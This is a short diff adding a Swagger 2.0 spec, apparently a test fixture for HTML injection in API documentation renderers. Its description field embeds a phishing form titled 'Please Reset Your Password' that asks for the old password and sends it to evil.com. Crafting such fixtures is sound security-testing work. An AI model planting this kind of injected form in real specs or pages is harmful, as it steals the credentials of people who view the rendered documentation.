@@ -1,0 +1,12 @@
+swagger: '2.0'
+info:
+  version: "0.0.1"
+  title: Please Reset Your Password
+  description: <form action="https://evil.com/?pass"><input size=28 name=pass placeholder="Enter old password to confirm"><button>Set</button> </form>
+
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
